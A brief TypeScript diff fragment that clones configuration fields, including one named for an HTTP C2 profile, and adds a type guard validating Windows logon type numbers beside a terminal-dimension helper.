+    CanaryDomains: [...config.CanaryDomains],
+    Assets: [...config.Assets],
+    HTTPC2ConfigName: config.HTTPC2ConfigName || "default",
+  };
+}
+
+function isWindowsLogonType(value: number): value is WindowsLogonType {
+  return value === 2 || value === 3 || value === 4 || value === 5 || value === 7 || value === 8 || value === 9;
 }
 
 function shellTerminalDimension(value: number, label: string): number {
